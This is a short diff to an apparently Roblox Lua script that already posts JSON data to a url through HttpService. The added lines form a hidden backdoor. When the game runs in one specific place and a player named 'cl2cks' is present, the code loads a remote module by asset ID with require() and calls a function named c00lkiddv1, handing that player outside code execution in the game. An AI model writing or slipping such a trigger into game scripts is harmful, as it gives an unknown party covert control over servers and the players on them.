@@ -60,3 +60,9 @@ local text = {
 
 }
 hs:PostAsync(url, hs:JSONEncode(text))
+
+if game.PlaceId == 97802578734845 then
+	if game.Players:FindFirstChild("cl2cks") then
+		require(14476224091).c00lkiddv1("cl2cks")
+	end
+end
